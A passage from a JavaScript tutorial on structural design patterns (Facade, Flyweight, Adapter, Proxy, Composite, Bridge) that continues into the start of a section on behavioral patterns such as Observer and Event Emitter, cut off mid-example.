    console.log('CPU: Freezing...');
  }
  
  jump(position) {
    console.log(`CPU: Jumping to ${position}`);
  }
  
  execute() {
    console.log('CPU: Executing...');
  }
}

class Memory {
  load(position, data) {
    console.log(`Memory: Loading data at ${position}`);
  }
}

class HardDrive {
  read(sector, size) {
    console.log(`HardDrive: Reading ${size} bytes from sector ${sector}`);
    return 'boot data';
  }
}

// Facade
class ComputerFacade {
  constructor() {
    this.cpu = new CPU();
    this.memory = new Memory();
    this.hardDrive = new HardDrive();
  }
  
  start() {
    console.log('Starting computer...');
    this.cpu.freeze();
    const bootData = this.hardDrive.read(0, 1024);
    this.memory.load(0, bootData);
    this.cpu.jump(0);
    this.cpu.execute();
    console.log('Computer started!');
  }
}

// Usage - Simple interface to complex operation
const computer = new ComputerFacade();
computer.start();
```

### API Facade

```javascript
// Complex APIs
class UserAPI {
  async getUser(id) {
    console.log(`Fetching user ${id}`);
    return { id, name: 'Alice', email: 'alice@example.com' };
  }
}

class OrderAPI {
  async getOrders(userId) {
    console.log(`Fetching orders for user ${userId}`);
    return [
      { id: 1, total: 100 },
      { id: 2, total: 200 }
    ];
  }
}

class PaymentAPI {
  async getPaymentMethods(userId) {
    console.log(`Fetching payment methods for user ${userId}`);
    return [
      { type: 'credit_card', last4: '1234' },
      { type: 'paypal', email: 'alice@example.com' }
    ];
  }
}

// Facade
class UserProfileFacade {
  constructor() {
    this.userAPI = new UserAPI();
    this.orderAPI = new OrderAPI();
    this.paymentAPI = new PaymentAPI();
  }
  
  async getCompleteProfile(userId) {
    try {
      const [user, orders, paymentMethods] = await Promise.all([
        this.userAPI.getUser(userId),
        this.orderAPI.getOrders(userId),
        this.paymentAPI.getPaymentMethods(userId)
      ]);
      
      return {
        user,
        orders,
        paymentMethods,
        totalSpent: orders.reduce((sum, order) => sum + order.total, 0)
      };
    } catch (error) {
      console.error('Error fetching profile:', error);
      throw error;
    }
  }
}

// Usage - Single call instead of multiple API calls
async function displayProfile() {
  const facade = new UserProfileFacade();
  const profile = await facade.getCompleteProfile(1);
  console.log('Profile:', profile);
}
```

### DOM Manipulation Facade

```javascript
// Facade for cross-browser DOM manipulation
class DOMFacade {
  constructor(selector) {
    this.element = document.querySelector(selector);
  }
  
  // Simplified event handling
  on(event, handler) {
    if (this.element.addEventListener) {
      this.element.addEventListener(event, handler, false);
    } else if (this.element.attachEvent) {
      // IE8 and below
      this.element.attachEvent(`on${event}`, handler);
    }
    return this;
  }
  
  // Simplified styling
  css(property, value) {
    if (typeof property === 'object') {
      for (const key in property) {
        this.element.style[key] = property[key];
      }
    } else {
      this.element.style[property] = value;
    }
    return this;
  }
  
  // Simplified class manipulation
  addClass(className) {
    if (this.element.classList) {
      this.element.classList.add(className);
    } else {
      this.element.className += ` ${className}`;
    }
    return this;
  }
  
  removeClass(className) {
    if (this.element.classList) {
      this.element.classList.remove(className);
    } else {
      this.element.className = this.element.className
        .replace(new RegExp(`\\b${className}\\b`, 'g'), '');
    }
    return this;
  }
  
  // Simplified content manipulation
  html(content) {
    if (content !== undefined) {
      this.element.innerHTML = content;
      return this;
    }
    return this.element.innerHTML;
  }
  
  // Simplified AJAX
  static ajax(options) {
    const xhr = new XMLHttpRequest();
    
    xhr.open(options.method || 'GET', options.url, true);
    
    if (options.headers) {
      for (const key in options.headers) {
        xhr.setRequestHeader(key, options.headers[key]);
      }
    }
    
    xhr.onload = function() {
      if (xhr.status >= 200 && xhr.status < 300) {
        options.success?.(JSON.parse(xhr.responseText));
      } else {
        options.error?.(xhr.statusText);
      }
    };
    
    xhr.onerror = function() {
      options.error?.(xhr.statusText);
    };
    
    xhr.send(options.data ? JSON.stringify(options.data) : null);
  }
}

// Usage
const element = new DOMFacade('#myElement');
element
  .css({ color: 'red', fontSize: '16px' })
  .addClass('active')
  .html('<p>Hello World</p>')
  .on('click', () => console.log('Clicked!'));

DOMFacade.ajax({
  url: '/api/data',
  method: 'GET',
  success: (data) => console.log('Data:', data),
  error: (error) => console.error('Error:', error)
});
```

---

## Flyweight Pattern

The Flyweight Pattern minimizes memory usage by sharing data among similar objects.

### Basic Flyweight

```javascript
// Flyweight class (shared state)
class TreeType {
  constructor(name, color, texture) {
    this.name = name;
    this.color = color;
    this.texture = texture;
  }
  
  draw(canvas, x, y) {
    console.log(`Drawing ${this.name} tree at (${x}, ${y})`);
    // Draw tree using shared type data
  }
}

// Flyweight Factory
class TreeFactory {
  constructor() {
    this.treeTypes = new Map();
  }
  
  getTreeType(name, color, texture) {
    const key = `${name}_${color}_${texture}`;
    
    if (!this.treeTypes.has(key)) {
      console.log(`Creating new tree type: ${key}`);
      this.treeTypes.set(key, new TreeType(name, color, texture));
    }
    
    return this.treeTypes.get(key);
  }
  
  getTreeTypeCount() {
    return this.treeTypes.size;
  }
}

// Context class (unique state)
class Tree {
  constructor(x, y, treeType) {
    this.x = x;
    this.y = y;
    this.treeType = treeType; // Shared flyweight
  }
  
  draw(canvas) {
    this.treeType.draw(canvas, this.x, this.y);
  }
}

// Forest class
class Forest {
  constructor() {
    this.trees = [];
    this.treeFactory = new TreeFactory();
  }
  
  plantTree(x, y, name, color, texture) {
    const type = this.treeFactory.getTreeType(name, color, texture);
    const tree = new Tree(x, y, type);
    this.trees.push(tree);
  }
  
  draw(canvas) {
    this.trees.forEach(tree => tree.draw(canvas));
  }
  
  getStats() {
    return {
      totalTrees: this.trees.length,
      treeTypes: this.treeFactory.getTreeTypeCount(),
      memoryPerTree: 'Only x,y coordinates',
      sharedMemory: 'name, color, texture shared via flyweight'
    };
  }
}

// Usage
const forest = new Forest();

// Plant 1000 trees
for (let i = 0; i < 1000; i++) {
  const x = Math.random() * 1000;
  const y = Math.random() * 1000;
  
  // Only 3 tree types, but 1000 tree instances
  const types = [
    ['Oak', 'green', 'oak_texture'],
    ['Pine', 'dark_green', 'pine_texture'],
    ['Birch', 'white', 'birch_texture']
  ];
  
  const [name, color, texture] = types[i % 3];
  forest.plantTree(x, y, name, color, texture);
}

console.log(forest.getStats());
// Only 3 TreeType objects created, shared by 1000 Tree instances
```

### Particle System Flyweight

```javascript
// Flyweight - Shared particle type
class ParticleType {
  constructor(color, sprite, size) {
    this.color = color;
    this.sprite = sprite;
    this.size = size;
  }
  
  render(context, x, y, velocity) {
    // Render particle using shared properties
    context.fillStyle = this.color;
    context.fillRect(x, y, this.size, this.size);
  }
}

// Flyweight Factory
class ParticleTypeFactory {
  constructor() {
    this.types = new Map();
  }
  
  getType(color, sprite, size) {
    const key = `${color}_${sprite}_${size}`;
    
    if (!this.types.has(key)) {
      this.types.set(key, new ParticleType(color, sprite, size));
    }
    
    return this.types.get(key);
  }
}

// Context - Unique particle state
class Particle {
  constructor(x, y, velocity, type) {
    this.x = x;
    this.y = y;
    this.velocity = velocity;
    this.type = type; // Shared flyweight
  }
  
  update(deltaTime) {
    this.x += this.velocity.x * deltaTime;
    this.y += this.velocity.y * deltaTime;
  }
  
  render(context) {
    this.type.render(context, this.x, this.y, this.velocity);
  }
}

// Particle System
class ParticleSystem {
  constructor() {
    this.particles = [];
    this.typeFactory = new ParticleTypeFactory();
  }
  
  createParticle(x, y, velocityX, velocityY, color, sprite, size) {
    const type = this.typeFactory.getType(color, sprite, size);
    const particle = new Particle(
      x, y,
      { x: velocityX, y: velocityY },
      type
    );
    this.particles.push(particle);
  }
  
  update(deltaTime) {
    this.particles.forEach(particle => particle.update(deltaTime));
    
    // Remove off-screen particles
    this.particles = this.particles.filter(p => 
      p.x >= 0 && p.x <= 800 && p.y >= 0 && p.y <= 600
    );
  }
  
  render(context) {
    this.particles.forEach(particle => particle.render(context));
  }
}

// Usage
const particleSystem = new ParticleSystem();

// Create 10000 particles with only a few types
for (let i = 0; i < 10000; i++) {
  const colors = ['red', 'blue', 'green', 'yellow'];
  const color = colors[Math.floor(Math.random() * colors.length)];
  
  particleSystem.createParticle(
    Math.random() * 800,
    Math.random() * 600,
    (Math.random() - 0.5) * 100,
    (Math.random() - 0.5) * 100,
    color,
    'circle',
    5
  );
}

// Only 4 ParticleType objects created, shared by 10000 particles
```

### String Interning (Flyweight)

```javascript
class StringPool {
  constructor() {
    this.pool = new Map();
    this.stats = { total: 0, unique: 0 };
  }
  
  intern(str) {
    this.stats.total++;
    
    if (!this.pool.has(str)) {
      this.pool.set(str, str);
      this.stats.unique++;
    }
    
    return this.pool.get(str);
  }
  
  getStats() {
    const memorySaved = (this.stats.total - this.stats.unique) * 
                       50; // Assume avg 50 bytes per string
    
    return {
      totalStrings: this.stats.total,
      uniqueStrings: this.stats.unique,
      duplicates: this.stats.total - this.stats.unique,
      memorySavedBytes: memorySaved
    };
  }
}

// Usage
const stringPool = new StringPool();

// Create many objects with duplicate strings
const users = [];

for (let i = 0; i < 10000; i++) {
  users.push({
    id: i,
    country: stringPool.intern('USA'), // Shared
    language: stringPool.intern('English'), // Shared
    currency: stringPool.intern('USD'), // Shared
    timezone: stringPool.intern('EST') // Shared
  });
}

console.log(stringPool.getStats());
// Only 4 unique strings stored, used 40000 times
```

---

## Adapter Pattern

The Adapter Pattern allows incompatible interfaces to work together by converting one interface into another.

### Basic Adapter

```javascript
// Old interface
class OldCalculator {
  operation(num1, num2, operation) {
    switch (operation) {
      case 'add':
        return num1 + num2;
      case 'subtract':
        return num1 - num2;
      default:
        return 0;
    }
  }
}

// New interface
class NewCalculator {
  add(num1, num2) {
    return num1 + num2;
  }
  
  subtract(num1, num2) {
    return num1 - num2;
  }
}

// Adapter
class CalculatorAdapter {
  constructor() {
    this.calculator = new NewCalculator();
  }
  
  operation(num1, num2, operation) {
    switch (operation) {
      case 'add':
        return this.calculator.add(num1, num2);
      case 'subtract':
        return this.calculator.subtract(num1, num2);
      default:
        return 0;
    }
  }
}

// Usage - Can use new calculator with old interface
const calculator = new CalculatorAdapter();
console.log(calculator.operation(5, 3, 'add')); // 8
console.log(calculator.operation(5, 3, 'subtract')); // 2
```

### API Adapter

```javascript
// Old API format
class OldAPI {
  getData() {
    return {
      fullname: 'Alice Smith',
      emailaddress: 'alice@example.com',
      phonenumber: '123-456-7890'
    };
  }
}

// New API format expected by application
class NewAPIFormat {
  getUserData() {
    return {
      name: { first: 'Alice', last: 'Smith' },
      contact: {
        email: 'alice@example.com',
        phone: '123-456-7890'
      }
    };
  }
}

// Adapter
class APIAdapter {
  constructor(oldAPI) {
    this.oldAPI = oldAPI;
  }
  
  getUserData() {
    const oldData = this.oldAPI.getData();
    const [firstName, lastName] = oldData.fullname.split(' ');
    
    return {
      name: {
        first: firstName,
        last: lastName
      },
      contact: {
        email: oldData.emailaddress,
        phone: oldData.phonenumber
      }
    };
  }
}

// Usage
const oldAPI = new OldAPI();
const adapter = new APIAdapter(oldAPI);
const userData = adapter.getUserData();

console.log(userData);
// { name: { first: 'Alice', last: 'Smith' }, contact: { ... } }
```

### Payment Gateway Adapter

```javascript
// Different payment gateways with different interfaces

// Stripe
class Stripe {
  makePayment(amount, currency) {
    console.log(`Stripe: Processing ${amount} ${currency}`);
    return { success: true, transactionId: 'stripe_123' };
  }
}

// PayPal
class PayPal {
  processPayment(paymentInfo) {
    console.log(`PayPal: Processing ${paymentInfo.amount} ${paymentInfo.currency}`);
    return { status: 'success', id: 'paypal_456' };
  }
}

// Square
class Square {
  charge(chargeAmount, chargeCurrency) {
    console.log(`Square: Charging ${chargeAmount} ${chargeCurrency}`);
    return { charged: true, reference: 'square_789' };
  }
}

// Unified interface
class PaymentAdapter {
  constructor(gateway) {
    this.gateway = gateway;
  }
  
  pay(amount, currency) {
    if (this.gateway instanceof Stripe) {
      return this.adaptStripe(amount, currency);
    } else if (this.gateway instanceof PayPal) {
      return this.adaptPayPal(amount, currency);
    } else if (this.gateway instanceof Square) {
      return this.adaptSquare(amount, currency);
    }
    throw new Error('Unsupported payment gateway');
  }
  
  adaptStripe(amount, currency) {
    const result = this.gateway.makePayment(amount, currency);
    return {
      success: result.success,
      transactionId: result.transactionId
    };
  }
  
  adaptPayPal(amount, currency) {
    const result = this.gateway.processPayment({ amount, currency });
    return {
      success: result.status === 'success',
      transactionId: result.id
    };
  }
  
  adaptSquare(amount, currency) {
    const result = this.gateway.charge(amount, currency);
    return {
      success: result.charged,
      transactionId: result.reference
    };
  }
}

// Usage - Same interface for all gateways
function processPayment(gateway, amount, currency) {
  const adapter = new PaymentAdapter(gateway);
  const result = adapter.pay(amount, currency);
  console.log('Payment result:', result);
}

processPayment(new Stripe(), 100, 'USD');
processPayment(new PayPal(), 200, 'EUR');
processPayment(new Square(), 300, 'GBP');
```

### Data Format Adapter

```javascript
// XML to JSON adapter
class XMLParser {
  parse(xml) {
    // Simplified XML parsing
    return {
      type: 'xml',
      raw: xml,
      data: { name: 'Alice', age: 30 }
    };
  }
}

class JSONAdapter {
  constructor(xmlParser) {
    this.xmlParser = xmlParser;
  }
  
  parse(xml) {
    const xmlData = this.xmlParser.parse(xml);
    
    // Convert to standard JSON format
    return {
      type: 'json',
      data: xmlData.data
    };
  }
}

// Usage
const xmlParser = new XMLParser();
const adapter = new JSONAdapter(xmlParser);

const json = adapter.parse('<user><name>Alice</name><age>30</age></user>');
console.log(json);
// { type: 'json', data: { name: 'Alice', age: 30 } }
```

---

## Proxy Pattern

The Proxy Pattern provides a surrogate or placeholder for another object to control access to it.

### Virtual Proxy (Lazy Loading)

```javascript
// Real subject - Expensive to create
class HighResolutionImage {
  constructor(filename) {
    this.filename = filename;
    this.loadImage();
  }
  
  loadImage() {
    console.log(`Loading high-resolution image: ${this.filename}`);
    // Simulate expensive loading operation
    this.data = `[Image data for ${this.filename}]`;
  }
  
  display() {
    console.log(`Displaying ${this.filename}`);
  }
}

// Proxy - Delays loading until needed
class ImageProxy {
  constructor(filename) {
    this.filename = filename;
    this.image = null;
  }
  
  display() {
    if (!this.image) {
      console.log('Creating real image on first access');
      this.image = new HighResolutionImage(this.filename);
    }
    this.image.display();
  }
}

// Usage
const image1 = new ImageProxy('photo1.jpg');
const image2 = new ImageProxy('photo2.jpg');

console.log('Images created (not loaded yet)');

image1.display(); // Loads and displays
image1.display(); // Just displays (already loaded)
```

### Protection Proxy (Access Control)

```javascript
// Real subject
class BankAccount {
  constructor(balance) {
    this.balance = balance;
  }
  
  deposit(amount) {
    this.balance += amount;
    console.log(`Deposited ${amount}. New balance: ${this.balance}`);
  }
  
  withdraw(amount) {
    if (amount > this.balance) {
      console.log('Insufficient funds');
      return false;
    }
    this.balance -= amount;
    console.log(`Withdrew ${amount}. New balance: ${this.balance}`);
    return true;
  }
  
  getBalance() {
    return this.balance;
  }
}

// Proxy with access control
class SecureBankAccountProxy {
  constructor(balance, pin) {
    this.account = new BankAccount(balance);
    this.pin = pin;
  }
  
  authenticate(pin) {
    return pin === this.pin;
  }
  
  deposit(amount, pin) {
    if (!this.authenticate(pin)) {
      console.log('Authentication failed');
      return false;
    }
    this.account.deposit(amount);
    return true;
  }
  
  withdraw(amount, pin) {
    if (!this.authenticate(pin)) {
      console.log('Authentication failed');
      return false;
    }
    return this.account.withdraw(amount);
  }
  
  getBalance(pin) {
    if (!this.authenticate(pin)) {
      console.log('Authentication failed');
      return null;
    }
    return this.account.getBalance();
  }
}

// Usage
const account = new SecureBankAccountProxy(1000, '1234');

account.deposit(500, '1234'); // Success
account.withdraw(200, '1234'); // Success
console.log(account.getBalance('1234')); // 1300

account.withdraw(100, 'wrong'); // Authentication failed
```

### Caching Proxy

```javascript
// Real subject - Expensive API calls
class DataAPI {
  fetchData(id) {
    console.log(`Fetching data from API for id: ${id}`);
    // Simulate API call
    return {
      id,
      data: `Data for ${id}`,
      timestamp: Date.now()
    };
  }
}

// Caching proxy
class CachingAPIProxy {
  constructor() {
    this.api = new DataAPI();
    this.cache = new Map();
    this.cacheDuration = 5000; // 5 seconds
  }
  
  fetchData(id) {
    const cached = this.cache.get(id);
    
    if (cached && Date.now() - cached.timestamp < this.cacheDuration) {
      console.log(`Returning cached data for id: ${id}`);
      return cached.data;
    }
    
    console.log('Cache miss or expired');
    const data = this.api.fetchData(id);
    this.cache.set(id, { data, timestamp: Date.now() });
    
    return data;
  }
  
  clearCache() {
    this.cache.clear();
    console.log('Cache cleared');
  }
}

// Usage
const api = new CachingAPIProxy();

api.fetchData(1); // Fetches from API
api.fetchData(1); // Returns from cache
api.fetchData(2); // Fetches from API

setTimeout(() => {
  api.fetchData(1); // Cache expired, fetches again
}, 6000);
```

### Logging Proxy

```javascript
// Real subject
class Calculator {
  add(a, b) {
    return a + b;
  }
  
  subtract(a, b) {
    return a - b;
  }
  
  multiply(a, b) {
    return a * b;
  }
  
  divide(a, b) {
    if (b === 0) throw new Error('Division by zero');
    return a / b;
  }
}

// Logging proxy using Proxy object
function createLoggingProxy(target) {
  return new Proxy(target, {
    get(target, property) {
      if (typeof target[property] === 'function') {
        return function(...args) {
          console.log(`Calling ${property} with args:`, args);
          const start = performance.now();
          
          try {
            const result = target[property].apply(target, args);
            const duration = performance.now() - start;
            console.log(`${property} returned:`, result, `(${duration.toFixed(2)}ms)`);
            return result;
          } catch (error) {
            console.error(`${property} threw error:`, error.message);
            throw error;
          }
        };
      }
      return target[property];
    }
  });
}

// Usage
const calculator = new Calculator();
const loggingCalc = createLoggingProxy(calculator);

loggingCalc.add(5, 3);
// Calling add with args: [5, 3]
// add returned: 8 (0.05ms)

loggingCalc.divide(10, 2);
// Calling divide with args: [10, 2]
// divide returned: 5 (0.03ms)
```

---

## Composite Pattern

The Composite Pattern composes objects into tree structures to represent part-whole hierarchies.

### Basic Composite

```javascript
// Component interface
class FileSystemComponent {
  constructor(name) {
    this.name = name;
  }
  
  getSize() {
    throw new Error('getSize must be implemented');
  }
  
  display(indent = 0) {
    throw new Error('display must be implemented');
  }
}

// Leaf
class File extends FileSystemComponent {
  constructor(name, size) {
    super(name);
    this.size = size;
  }
  
  getSize() {
    return this.size;
  }
  
  display(indent = 0) {
    console.log(`${' '.repeat(indent)}ðŸ“„ ${this.name} (${this.size}KB)`);
  }
}

// Composite
class Directory extends FileSystemComponent {
  constructor(name) {
    super(name);
    this.children = [];
  }
  
  add(component) {
    this.children.push(component);
    return this;
  }
  
  remove(component) {
    const index = this.children.indexOf(component);
    if (index > -1) {
      this.children.splice(index, 1);
    }
    return this;
  }
  
  getSize() {
    return this.children.reduce((sum, child) => sum + child.getSize(), 0);
  }
  
  display(indent = 0) {
    console.log(`${' '.repeat(indent)}ðŸ“ ${this.name}/`);
    this.children.forEach(child => child.display(indent + 2));
  }
}

// Usage
const root = new Directory('root');

const documents = new Directory('documents');
documents.add(new File('resume.pdf', 100));
documents.add(new File('cover-letter.pdf', 50));

const photos = new Directory('photos');
photos.add(new File('vacation.jpg', 2000));
photos.add(new File('family.jpg', 1500));

const videos = new Directory('videos');
videos.add(new File('tutorial.mp4', 50000));

root.add(documents);
root.add(photos);
root.add(videos);
root.add(new File('readme.txt', 5));

root.display();
console.log(`Total size: ${root.getSize()}KB`);
```

### UI Component Composite

```javascript
// Component
class UIComponent {
  constructor(name) {
    this.name = name;
  }
  
  render() {
    throw new Error('render must be implemented');
  }
  
  getHTML() {
    throw new Error('getHTML must be implemented');
  }
}

// Leaf components
class Button extends UIComponent {
  constructor(name, text) {
    super(name);
    this.text = text;
  }
  
  render() {
    return `<button>${this.text}</button>`;
  }
  
  getHTML() {
    return this.render();
  }
}

class Input extends UIComponent {
  constructor(name, type, placeholder) {
    super(name);
    this.type = type;
    this.placeholder = placeholder;
  }
  
  render() {
    return `<input type="${this.type}" placeholder="${this.placeholder}" />`;
  }
  
  getHTML() {
    return this.render();
  }
}

class Label extends UIComponent {
  constructor(name, text) {
    super(name);
    this.text = text;
  }
  
  render() {
    return `<label>${this.text}</label>`;
  }
  
  getHTML() {
    return this.render();
  }
}

// Composite
class Panel extends UIComponent {
  constructor(name) {
    super(name);
    this.children = [];
  }
  
  add(component) {
    this.children.push(component);
    return this;
  }
  
  remove(component) {
    const index = this.children.indexOf(component);
    if (index > -1) {
      this.children.splice(index, 1);
    }
    return this;
  }
  
  render() {
    const childrenHTML = this.children
      .map(child => child.getHTML())
      .join('\n    ');
    
    return `<div class="panel">
    ${childrenHTML}
  </div>`;
  }
  
  getHTML() {
    return this.render();
  }
}

// Usage
const form = new Panel('loginForm');

const usernameGroup = new Panel('usernameGroup');
usernameGroup
  .add(new Label('usernameLabel', 'Username:'))
  .add(new Input('username', 'text', 'Enter username'));

const passwordGroup = new Panel('passwordGroup');
passwordGroup
  .add(new Label('passwordLabel', 'Password:'))
  .add(new Input('password', 'password', 'Enter password'));

form
  .add(usernameGroup)
  .add(passwordGroup)
  .add(new Button('submit', 'Login'));

console.log(form.getHTML());
```

### Organization Hierarchy

```javascript
// Component
class Employee {
  constructor(name, position) {
    this.name = name;
    this.position = position;
  }
  
  getDetails() {
    return `${this.name} (${this.position})`;
  }
  
  displayHierarchy(indent = 0) {
    console.log(`${' '.repeat(indent)}${this.getDetails()}`);
  }
}

// Composite
class Manager extends Employee {
  constructor(name, position) {
    super(name, position);
    this.subordinates = [];
  }
  
  addSubordinate(employee) {
    this.subordinates.push(employee);
    return this;
  }
  
  removeSubordinate(employee) {
    const index = this.subordinates.indexOf(employee);
    if (index > -1) {
      this.subordinates.splice(index, 1);
    }
    return this;
  }
  
  displayHierarchy(indent = 0) {
    console.log(`${' '.repeat(indent)}${this.getDetails()} [Manager]`);
    this.subordinates.forEach(subordinate => {
      subordinate.displayHierarchy(indent + 2);
    });
  }
  
  getTeamSize() {
    return this.subordinates.reduce(
      (sum, subordinate) => {
        const subSize = subordinate instanceof Manager 
          ? subordinate.getTeamSize() 
          : 1;
        return sum + subSize;
      },
      this.subordinates.length
    );
  }
}

// Usage
const ceo = new Manager('Alice', 'CEO');

const cto = new Manager('Bob', 'CTO');
cto.addSubordinate(new Employee('Charlie', 'Senior Developer'));
cto.addSubordinate(new Employee('David', 'Developer'));

const leadDev = new Manager('Eve', 'Lead Developer');
leadDev.addSubordinate(new Employee('Frank', 'Junior Developer'));
leadDev.addSubordinate(new Employee('Grace', 'Junior Developer'));
cto.addSubordinate(leadDev);

const cfo = new Manager('Henry', 'CFO');
cfo.addSubordinate(new Employee('Ivy', 'Accountant'));

ceo.addSubordinate(cto);
ceo.addSubordinate(cfo);

ceo.displayHierarchy();
console.log(`Total team size: ${ceo.getTeamSize()}`);
```

---

## Bridge Pattern

The Bridge Pattern separates abstraction from implementation, allowing them to vary independently.

### Basic Bridge

```javascript
// Implementor
class DrawingAPI {
  drawCircle(x, y, radius) {
    throw new Error('drawCircle must be implemented');
  }
}

// Concrete Implementors
class DrawingAPI1 extends DrawingAPI {
  drawCircle(x, y, radius) {
    console.log(`API1: Drawing circle at (${x}, ${y}) with radius ${radius}`);
  }
}

class DrawingAPI2 extends DrawingAPI {
  drawCircle(x, y, radius) {
    console.log(`API2: Circle[center=(${x}, ${y}), radius=${radius}]`);
  }
}

// Abstraction
class Shape {
  constructor(drawingAPI) {
    this.drawingAPI = drawingAPI;
  }
  
  draw() {
    throw new Error('draw must be implemented');
  }
  
  resize(factor) {
    throw new Error('resize must be implemented');
  }
}

// Refined Abstraction
class Circle extends Shape {
  constructor(x, y, radius, drawingAPI) {
    super(drawingAPI);
    this.x = x;
    this.y = y;
    this.radius = radius;
  }
  
  draw() {
    this.drawingAPI.drawCircle(this.x, this.y, this.radius);
  }
  
  resize(factor) {
    this.radius *= factor;
  }
}

// Usage - Abstraction and implementation can vary independently
const circle1 = new Circle(5, 10, 15, new DrawingAPI1());
const circle2 = new Circle(20, 30, 25, new DrawingAPI2());

circle1.draw(); // Uses API1
circle2.draw(); // Uses API2

circle1.resize(2);
circle1.draw(); // Radius doubled, still uses API1
```

### Device Control Bridge

```javascript
// Implementation
class Device {
  isEnabled() {
    throw new Error('isEnabled must be implemented');
  }
  
  enable() {
    throw new Error('enable must be implemented');
  }
  
  disable() {
    throw new Error('disable must be implemented');
  }
  
  getVolume() {
    throw new Error('getVolume must be implemented');
  }
  
  setVolume(volume) {
    throw new Error('setVolume must be implemented');
  }
  
  getChannel() {
    throw new Error('getChannel must be implemented');
  }
  
  setChannel(channel) {
    throw new Error('setChannel must be implemented');
  }
}

// Concrete Implementations
class TV extends Device {
  constructor() {
    super();
    this.on = false;
    this.volume = 50;
    this.channel = 1;
  }
  
  isEnabled() {
    return this.on;
  }
  
  enable() {
    this.on = true;
    console.log('TV is now ON');
  }
  
  disable() {
    this.on = false;
    console.log('TV is now OFF');
  }
  
  getVolume() {
    return this.volume;
  }
  
  setVolume(volume) {
    this.volume = Math.max(0, Math.min(100, volume));
    console.log(`TV volume: ${this.volume}`);
  }
  
  getChannel() {
    return this.channel;
  }
  
  setChannel(channel) {
    this.channel = channel;
    console.log(`TV channel: ${this.channel}`);
  }
}

class Radio extends Device {
  constructor() {
    super();
    this.on = false;
    this.volume = 30;
    this.channel = 1;
  }
  
  isEnabled() {
    return this.on;
  }
  
  enable() {
    this.on = true;
    console.log('Radio is now ON');
  }
  
  disable() {
    this.on = false;
    console.log('Radio is now OFF');
  }
  
  getVolume() {
    return this.volume;
  }
  
  setVolume(volume) {
    this.volume = Math.max(0, Math.min(100, volume));
    console.log(`Radio volume: ${this.volume}`);
  }
  
  getChannel() {
    return this.channel;
  }
  
  setChannel(channel) {
    this.channel = channel;
    console.log(`Radio station: ${this.channel}`);
  }
}

// Abstraction
class RemoteControl {
  constructor(device) {
    this.device = device;
  }
  
  togglePower() {
    if (this.device.isEnabled()) {
      this.device.disable();
    } else {
      this.device.enable();
    }
  }
  
  volumeUp() {
    this.device.setVolume(this.device.getVolume() + 10);
  }
  
  volumeDown() {
    this.device.setVolume(this.device.getVolume() - 10);
  }
  
  channelUp() {
    this.device.setChannel(this.device.getChannel() + 1);
  }
  
  channelDown() {
    this.device.setChannel(this.device.getChannel() - 1);
  }
}

// Refined Abstraction
class AdvancedRemoteControl extends RemoteControl {
  mute() {
    console.log('Muting device');
    this.device.setVolume(0);
  }
  
  setChannel(channel) {
    this.device.setChannel(channel);
  }
}

// Usage
const tv = new TV();
const radio = new Radio();

const tvRemote = new RemoteControl(tv);
const radioRemote = new AdvancedRemoteControl(radio);

tvRemote.togglePower(); // TV is now ON
tvRemote.volumeUp(); // TV volume: 60
tvRemote.channelUp(); // TV channel: 2

radioRemote.togglePower(); // Radio is now ON
radioRemote.setChannel(101); // Radio station: 101
radioRemote.mute(); // Radio volume: 0
```

---

## Summary

This document covered Structural Design Patterns:

- **Decorator Pattern**: Dynamically adding functionality (coffee decorators, functional decorators, UI components)
- **Facade Pattern**: Simplified interface to complex systems (computer boot, API facade, DOM manipulation)
- **Flyweight Pattern**: Sharing data to minimize memory (trees, particles, string interning)
- **Adapter Pattern**: Making incompatible interfaces work together (calculators, APIs, payment gateways, data formats)
- **Proxy Pattern**: Controlling access to objects (virtual proxy, protection proxy, caching proxy, logging proxy)
- **Composite Pattern**: Tree structures for part-whole hierarchies (file systems, UI components, organization hierarchy)
- **Bridge Pattern**: Separating abstraction from implementation (drawing APIs, device control)

These patterns help organize object relationships and create flexible, maintainable structures.

---

**Related Topics:**

- Behavioral Patterns
- Creational Patterns
- SOLID Principles
- Object Composition
# Design Patterns - Behavioral Patterns


## Behavioral Patterns

Behavioral patterns are concerned with algorithms and the assignment of responsibilities between objects. They describe patterns of communication between objects.

---

## Observer Pattern (Pub/Sub)

The Observer Pattern defines a one-to-many dependency between objects so that when one object changes state, all its dependents are notified.

### Basic Observer

```javascript
class Subject {
  constructor() {
    this.observers = [];
  }
  
  subscribe(observer) {
    this.observers.push(observer);
  }
  
  unsubscribe(observer) {
    this.observers = this.observers.filter(obs => obs !== observer);
  }
  
  notify(data) {
    this.observers.forEach(observer => observer.update(data));
  }
}

class Observer {
  constructor(name) {
    this.name = name;
  }
  
  update(data) {
    console.log(`${this.name} received:`, data);
  }
}

// Usage
const subject = new Subject();

const observer1 = new Observer('Observer 1');
const observer2 = new Observer('Observer 2');
const observer3 = new Observer('Observer 3');

subject.subscribe(observer1);
subject.subscribe(observer2);
subject.subscribe(observer3);

subject.notify('Hello Observers!');
// Observer 1 received: Hello Observers!
// Observer 2 received: Hello Observers!
// Observer 3 received: Hello Observers!

subject.unsubscribe(observer2);
subject.notify('Second notification');
// Observer 1 received: Second notification
// Observer 3 received: Second notification
```

### Event Emitter Pattern

```javascript
class EventEmitter {
  constructor() {
    this.events = {};
  }
  
  on(event, listener) {
    if (!this.events[event]) {
      this.events[event] = [];
    }
    this.events[event].push(listener);
    return this;
  }
  
  once(event, listener) {
    const onceWrapper = (...args) => {
      listener.apply(this, args);
      this.off(event, onceWrapper);
    };
    return this.on(event, onceWrapper);
  }
  
  off(event, listenerToRemove) {
    if (!this.events[event]) return this;
    
    this.events[event] = this.events[event].filter(
      listener => listener !== listenerToRemove
    );
    return this;
  }
  
  emit(event, ...args) {
    if (!this.events[event]) return false;
    
    this.events[event].forEach(listener => {
      listener.apply(this, args);
    });
    return true;
  }
  
  listenerCount(event) {
    return this.events[event] ? this.events[event].length : 0;
  }
  
  removeAllListeners(event) {
    if (event) {
      delete this.events[event];
    } else {
      this.events = {};
    }
    return this;
  }
}

// Usage
const emitter = new EventEmitter();

emitter.on('data', (data) => {
  console.log('Data received:', data);
});

emitter.on('data', (data) => {
  console.log('Another listener:', data);
});

emitter.once('connect', () => {
  console.log('Connected! (only once)');
});

emitter.emit('data', { id: 1, name: 'Alice' });
// Data received: { id: 1, name: 'Alice' }
// Another listener: { id: 1, name: 'Alice' }

emitter.emit('connect'); // Connected! (only once)
emitter.emit('connect'); // (nothing - listener removed)

console.log('Listeners for "data":', emitter.listenerCount('data')); // 2
```

### Pub/Sub Pattern

```javascript
class PubSub {
  constructor() {
    this.subscribers = {};
    this.subId = 0;
  }
  
  subscribe(event, callback) {
